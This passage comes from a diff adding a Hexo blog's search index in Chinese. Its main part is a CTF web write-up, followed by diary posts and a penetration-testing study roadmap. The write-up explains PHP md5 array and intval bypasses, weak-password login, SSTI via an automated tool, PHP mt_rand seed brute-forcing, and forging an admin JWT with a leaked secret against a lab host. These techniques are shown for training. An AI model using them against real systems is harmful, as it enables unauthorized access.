highlight_file(__FILE__);  &#125;  else&#123;      include_once &quot;loginok.html&quot;;  &#125;  $a=$_GET[&#39;a&#39;];  $b=$_GET[&#39;b&#39;];  $hash=$_COOKIE[&#39;hash&#39;];  $word=$_POST[&#39;word&#39;];  if($a !== $b &amp; md5($a) === md5($b))&#123;      echo &#39; WOW,u are so cool &#39;;      echo strlen($flag);  &#125;  if (preg_match(&#39;/^1952(.*?)NUAA$/&#39;, $word))&#123;      if(intval($word) === intval(strrev($word)))&#123;          echo &quot; 宝贝,flag快出来了哦,加油捏 &quot;;          echo md5($flag);      &#125;  &#125;  if ($hash === md5($flag . $word))        echo &quot; Wooooooo!You cracked the md5. Here is your flag &quot; . $flag;  ?&gt;</code></pre><pre><code class="php">大概有三层判断：1`.if($a !== $b &amp; md5($a) === md5($b))&#123;`2`.`if (preg_match(&#39;/^1952(.*?)NUAA$/&#39;, $word))&#123;      if(intval($word) === intval(strrev($word)))&#123;``3`.if ($hash === md5($flag . $word))`</code></pre><h3 id="1-值不相同但md5加密后相同（数组绕过md5强比较）"><a href="#1-值不相同但md5加密后相同（数组绕过md5强比较）" class="headerlink" title="1. 值不相同但md5加密后相同（数组绕过md5强比较）"></a>1. 值不相同但md5加密后相同（数组绕过md5强比较）</h3><ul><li>通过数组类型一致，但值不一致。</li><li>md5()函数无法处理数组，如果传入的为数组，会返回NULL，所以两个数组经过加密后得到的都是NULL,也就是相等的。</li><li>中间的为什么是&amp;而不是&amp;&amp;。在此题当中都是成立的，详细的说明可以查看<a href=https://www.runoob.com/note/34429>菜鸟教程</a></li></ul><h3 id="2-1952开头NUAA结尾，倒序并interval-后仍相同"><a href="#2-1952开头NUAA结尾，倒序并interval-后仍相同" class="headerlink" title="2.1952开头NUAA结尾，倒序并interval()后仍相同"></a>2.1952开头NUAA结尾，倒序并interval()后仍相同</h3><ul><li>正常进行输入的情况如下： <img src="https://cdn.jsdelivr.net/gh/g1an123/blogimage@main/%E6%88%AA%E5%B1%8F2023-08-22%2020.54.27.png"><br>相关定义可以自己去查一下（我懒）</li></ul><p>大概思路: 正序的字符串比较好控制大小，而倒序的感觉有点难办。<br>小trick：科学计数法<br>我们可以通过科学计数法使得正向的字符串经过intval后变为0也就实现了绕过。</p><p>payload:<br><img src="https://cdn.jsdelivr.net/gh/g1an123/blogimage@main/%E6%88%AA%E5%B1%8F2023-08-22%2021.05.58.png"></p><p>得到md5值</p><h3 id="3-word置空进行绕过。"><a href="#3-word置空进行绕过。" class="headerlink" title="3.word置空进行绕过。"></a>3.word置空进行绕过。</h3><p>这里就不要想的太复杂哈哈哈哈哈哈哈。还得是小小姐。<br>word参数直接置空并且加上hash就可以得到flag了。</p><p>下班！</p><h2 id="伤身体（ssti"><a href="#伤身体（ssti" class="headerlink" title="伤身体（ssti"></a>伤身体（ssti</h2><p>1azy_fish沉迷于某六字游戏，在他大意的时候，快偷了他的flag！！！</p><h3 id="弱口令登入"><a href="#弱口令登入" class="headerlink" title="弱口令登入"></a>弱口令登入</h3><p>admin:password</p><h3 id="ssti注入"><a href="#ssti注入" class="headerlink" title="ssti注入"></a>ssti注入</h3><p>ssti注入我就大概知道个原理，于是呢就直接工具梭哈啦。<br>打开fenjing直接一把嗦，具体用法自己查一下吧。</p><h2 id="来抽个奖？"><a href="#来抽个奖？" class="headerlink" title="来抽个奖？"></a>来抽个奖？</h2><p>1azy_fish觉得有随机数在，他就不会亏卡，快爆了他，让他血本无归。</p><h4 id="php伪随机数漏洞"><a href="#php伪随机数漏洞" class="headerlink" title="php伪随机数漏洞"></a>php伪随机数漏洞</h4><p>多次刷新发现随机数始终相同，于是猜测肯定使用的同一个种子。漏洞请往下翻翻。</p><h3 id="爆破种子"><a href="#爆破种子" class="headerlink" title="爆破种子"></a>爆破种子</h3><p>爆破种子工具包 <a href=https://github.com/openwall/php_mt_seed>php_mt_seed</a><br>使用教程看看README就行。</p><h3 id="漏洞了解"><a href="#漏洞了解" class="headerlink" title="漏洞了解"></a>漏洞了解</h3><p><img src="https://cdn.jsdelivr.net/gh/g1an123/blogimage@main/%E6%88%AA%E5%B1%8F2023-08-22%2021.21.05.png"></p><pre><code class="php">&lt;?php  mt_srand(5201314);  echo mt_rand().PHP_EOL;  echo mt_rand().PHP_EOL;  echo mt_rand().PHP_EOL;  echo mt_rand().PHP_EOL;  ?&gt;</code></pre><p>可以通过多次实验发现相同种子下，都是相同的数据，相同的顺序。</p><p>下班！</p><h2 id="我不是op！"><a href="#我不是op！" class="headerlink" title="我不是op！"></a>我不是op！</h2><p>1azy_fish说他自己不是op，你可以登录它的管理员账号看看他到底是不是op吗？</p><p>尝试弱口令无果后随便打一个用户名，发现返回包<br><img src="https://cdn.jsdelivr.net/gh/g1an123/blogimage@main/%E6%88%AA%E5%B1%8F2023-08-17%2012.01.55.png"><br><img src="https://cdn.jsdelivr.net/gh/g1an123/blogimage@main/%E6%88%AA%E5%B1%8F2023-08-17%2012.02.06.png"><br>得到token一眼jwt，同时解编码message上面的unicode<br><img src="https://cdn.jsdelivr.net/gh/g1an123/blogimage@main/%E6%88%AA%E5%B1%8F2023-08-17%2012.03.32.png"><br>然后带这个token去&#x2F;protected<br>需要注意的点（这个token是jwt，需要放在cookie里面进行传参）<br>使用GET请求</p><p>构造后的burp请求包：<br><img src="https://cdn.jsdelivr.net/gh/g1an123/blogimage@main/%E6%88%AA%E5%B1%8F2023-08-17%2012.07.12.png"></p><pre><code>GET http://101.42.30.15:8306/protected HTTP/1.1Host: 101.42.30.15:8306Pragma: no-cacheCache-Control: no-cache  Upgrade-Insecure-Requests: 1User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.5666.197 Safari/537.36Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,\*/\*;q=0.8,application/signed-exchange;v=b3;q=0.7   Accept-Encoding: gzip, deflateAccept-Language: zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7Cookie: session=7fa98980-e33f-4e0b-9213-4c1616d16f94.62XYmGmHDaMHpnRNYQEY--rTTK0; token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImFkbWluJyJ9.ATUoxudr6sa0eNyMUQqU155AeGVsuv90_CM-T_WVlKMsec-ch-ua-platform: &quot;Windows&quot;sec-ch-ua: &quot;Google Chrome&quot;;v=&quot;113&quot;, &quot;Chromium&quot;;v=&quot;113&quot;, &quot;Not=A?Brand&quot;;v=&quot;24&quot; sec-ch-ua-mobile: ?0Connection: close</code></pre><p>返回包里<br><code>&lt;!--secret_key = &quot;Lazy_fish_Is_op?&quot;--&gt;</code><br>应该就是jwt的密钥了<br>于是直接找个在线jwt网站篡改一下jwt就可以越权到admin了(网站： <a href="https://jwt.io/">https://jwt.io/</a>)<br><img src="https://cdn.jsdelivr.net/gh/g1an123/blogimage@main/%E6%88%AA%E5%B1%8F2023-08-17%2012.12.01.png"><br>直接修改111为admin然后得到admin的 jwt<br>带这admin的jwt重新访问即可得到flag<br><img src="https://cdn.jsdelivr.net/gh/g1an123/blogimage@main/%E6%88%AA%E5%B1%8F2023-08-17%2012.13.50.png"></p><p>Shark{1aZyfish_is_0pppppppppp!}</p>]]></content>
+      
+      
+      <categories>
+          
+          <category> ctf </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> writeup </tag>
+            
+            <tag> web </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>博客更新</title>
+      <link href="/2023/08/22/%E5%8D%9A%E5%AE%A2%E6%9B%B4%E6%96%B0/"/>
+      <url>/2023/08/22/%E5%8D%9A%E5%AE%A2%E6%9B%B4%E6%96%B0/</url>
+      
+        <content type="html"><![CDATA[<p>今天早上更新了搜索栏和留言板。初步更新基本完成，后面就要开始更新我的水文啦。</p><p>欢迎大家留言，指导指导小菜鸡哈（orz）。</p>]]></content>
+      
+      
+      
+        <tags>
+            
+            <tag> blog </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>日记</title>
+      <link href="/2023/08/22/%E6%97%A5%E8%AE%B0/"/>
+      <url>/2023/08/22/%E6%97%A5%E8%AE%B0/</url>
+      
+        <content type="html"><![CDATA[<p>今天事情比较多，今日战绩：图床搭建完成。</p><p>下班！</p>]]></content>
+      
+      
+      <categories>
+          
+          <category> Diary </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> blog </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>My First Post</title>
+      <link href="/2023/08/20/My-First-Post/"/>
+      <url>/2023/08/20/My-First-Post/</url>
+      
+        <content type="html"><![CDATA[<p>Welcome to my blog.</p><p>搭建了一天，终于上线了。</p><p>暑假开始的时候有一个Plan，完成了个P,因为lan。</p><p>后面会随缘更新，更新内容也不确定。凑合着看吧。</p>]]></content>
+      
+      
+      <categories>
+          
+          <category> Diary </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> hello </tag>
+            
+            <tag> blog </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>渗透测试入门</title>
+      <link href="/2023/08/20/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%85%A5%E9%97%A8/"/>
+      <url>/2023/08/20/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%85%A5%E9%97%A8/</url>
+      
+        <content type="html"><![CDATA[<p>#入门</p><p>练习时长：八周（3又五分之一坤周）</p><h1 id="web开发入门（两周）"><a href="#web开发入门（两周）" class="headerlink" title="web开发入门（两周）"></a>web开发入门（两周）</h1><p><strong>前端语言</strong>:  HTML+CSS+javascript<br>建议时长： 三天 （JS要求高，dom树看懂）</p><p><strong>脚本语言</strong> : python+网络基础和HTTP协议<br>建议时长：七天 </p><p><strong>后端语言</strong>:PHP+SQL+MySQL数据库<br>建议时长：三天（第一门后端语言建议php，因为比较简单，当然你也可以直接入手其他的语言java，go之类的）</p><p><strong>学习方式</strong>： 菜鸟教程进行速通上面的语言学习。</p><p><strong>学习任务</strong>：注册登录页面和登录成功展示静态百度页面</p><h1 id="web渗透入门"><a href="#web渗透入门" class="headerlink" title="web渗透入门"></a>web渗透入门</h1><h2 id="一、信息收集（三天）"><a href="#一、信息收集（三天）" class="headerlink" title="一、信息收集（三天）"></a>一、信息收集（三天）</h2><p>如子域名收集、备案查询、github 敏感信息查找等等，知道的方式越多，收集的信息也越多。<br>详细文章： <a href="https://www.freebuf.com/articles/web/340195.html">https://www.freebuf.com/articles/web/340195.html</a> </p><p>利用一些工具减轻工作量：</p><ol><li>灯塔ARL   <a href="https://github.com/TophantTechnology/ARL">https://github.com/TophantTechnology/ARL</a><br>魔改： <a href="https://mp.weixin.qq.com/s/ITvbc9GwqGihUECfRv66Aw">https://mp.weixin.qq.com/s/ITvbc9GwqGihUECfRv66Aw</a></li><li>水泽  <a href="https://github.com/0x727/ShuiZe_0x727">https://github.com/0x727/ShuiZe_0x727</a></li></ol><h2 id="二、常见漏洞利用（三周）"><a href="#二、常见漏洞利用（三周）" class="headerlink" title="二、常见漏洞利用（三周）"></a>二、常见漏洞利用（三周）</h2><p>对于入门级的渗透测试，可以先掌握 OWASP Top 10 的漏洞、如最常见的 SQL 注入漏洞、XSS 漏洞、文件上传漏洞、越权漏洞、弱口令等。</p><p>看一些报告：<br>edusrc:闲鱼上或者自己搜一搜，公众号也有很多文章<br>乌云： <a href="https://wy.zone.ci/">https://wy.zone.ci/</a><br>h1：同样建议搜一搜</p><h2 id="三、渗透测试常用工具使用。-两周"><a href="#三、渗透测试常用工具使用。-两周" class="headerlink" title="三、渗透测试常用工具使用。(两周)"></a>三、渗透测试常用工具使用。(两周)</h2><p>对于入门级的渗透测试，会使用 nmap、Burpsuite、Kali Linux 、sqlmap 就基本足够了。</p><p>靶场：</p><ol><li>pikachu： <a href="https://github.com/zhuifengshaonianhanlu/pikachu">https://github.com/zhuifengshaonianhanlu/pikachu</a></li><li>vulhub： <a href="https://blog.csdn.net/weixin_45744814/article/details/120185420?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522168896524816782425130413%2522%252C%2522scm%2522%253A%252220140713.130102334..%2522%257D&request_id=168896524816782425130413&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~all~top_positive~default-1-120185420-null-null.142%5Ev88%5Econtrol_2,239%5Ev2%5Einsert_chatgpt&utm_term=vulhub&spm=1018.2226.3001.4187">https://blog.csdn.net/weixin_45744814/article/details/120185420?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522168896524816782425130413%2522%252C%2522scm%2522%253A%252220140713.130102334..%2522%257D&amp;request_id=168896524816782425130413&amp;biz_id=0&amp;utm_medium=distribute.pc_search_result.none-task-blog-2~all~top_positive~default-1-120185420-null-null.142^v88^control_2,239^v2^insert_chatgpt&amp;utm_term=vulhub&amp;spm=1018.2226.3001.4187</a> </li><li>tryhackme: <a href="https://tryhackme.com/">https://tryhackme.com/</a> (推荐)</li><li>hackthebox： <a href="https://www.hackthebox.com/">https://www.hackthebox.com/</a></li></ol><p>搭建自己的军火库🧰：</p><ol><li>chorme插件 <a href="https://zhuanlan.zhihu.com/p/257021053">https://zhuanlan.zhihu.com/p/257021053</a></li><li>翻墙🧱： v2ray或者clashforwindows +✈️机场（点到为止）</li><li>渗透工具:自己囤一囤，<del>肖佬说:(不行就自己开一个)。</del></li><li>武装bp：<br>         1.  <a href="https://mp.weixin.qq.com/s/vGAOO0ZLXd55FTaGkiOILg">https://mp.weixin.qq.com/s/vGAOO0ZLXd55FTaGkiOILg</a><br>         2. <a href="https://mp.weixin.qq.com/s/6VsFwJO4Q5T0AomngEh6Wg">https://mp.weixin.qq.com/s/6VsFwJO4Q5T0AomngEh6Wg</a><br>         3. <a href="https://mp.weixin.qq.com/s/zGtiHhA5udqQOps8nxu1-g">https://mp.weixin.qq.com/s/zGtiHhA5udqQOps8nxu1-g</a></li><li>安装kali： <a href="https://blog.csdn.net/m0_72984458/article/details/131643173?utm_source=miniapp_weixin">https://blog.csdn.net/m0_72984458/article/details/131643173?utm_source=miniapp_weixin</a>  <del>（肖佬说： “算了，我自己写一篇吧”）</del></li></ol><h2 id="学习资源"><a href="#学习资源" class="headerlink" title="学习资源"></a>学习资源</h2><p>社区：</p><ol><li>先知社区： <a href="https://xz.aliyun.com/">https://xz.aliyun.com/</a></li><li>网安：         <a href="https://www.wangan.com/">https://www.wangan.com/</a></li><li>freebuf:       <a href="https://www.freebuf.com/">https://www.freebuf.com/</a></li><li>奇安信攻防社区： <a href="https://forum.butian.net/">https://forum.butian.net/</a></li></ol><p>导航：</p><ol><li>黑客街： <a href="https://www.hackjie.com/">https://www.hackjie.com/</a></li></ol><p>公众号： </p><ol><li>鹏组安全</li><li>菜鸟学信安</li><li>李白你好</li></ol><p>参考文章：<br><a href="https://blog.csdn.net/qq_28205153/article/details/123941798">https://blog.csdn.net/qq_28205153/article/details/123941798</a><br><a href="https://cloud.tencent.com/developer/article/2102308">https://cloud.tencent.com/developer/article/2102308</a></p><h1 id="写在最后"><a href="#写在最后" class="headerlink" title="写在最后"></a>写在最后</h1><ul><li><p>建议0基础的同学先从web简单开发开始学。</p></li><li><p>注意⚠️：每个阶段标注的时间可以理解为我乱写的，实际上有很多碎的东西需要去学，还有一些知识看起来东西很多，但是实际时间花销其实不多，所以时间上出入较大，不必理会。</p></li><li><p>找到适合自己的学习路线和方式</p></li><li><p>使用ai提高效率</p></li></ul>]]></content>
+      
+      
+      <categories>
+          
+          <category> 渗透测试 </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> 渗透测试 </tag>
+            
+            <tag> 入门 </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>Hello World</title>
+      <link href="/2023/08/20/hello-world/"/>
+      <url>/2023/08/20/hello-world/</url>
+      
+        <content type="html"><![CDATA[<p>Welcome to <a href="https://hexo.io/">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues">GitHub</a>.</p><h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><pre><code class="bash">$ hexo new &quot;My New Post&quot;</code></pre><p>More info: <a href="https://hexo.io/docs/writing.html">Writing</a></p><h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><pre><code class="bash">$ hexo server</code></pre><p>More info: <a href="https://hexo.io/docs/server.html">Server</a></p><h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><pre><code class="bash">$ hexo generate</code></pre><p>More info: <a href="https://hexo.io/docs/generating.html">Generating</a></p><h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><pre><code class="bash">$ hexo deploy</code></pre><p>More info: <a href="https://hexo.io/docs/one-command-deployment.html">Deployment</a></p>]]></content>
+      
+      
+      
+    </entry>
+    
+    
+  
+  
+</search>
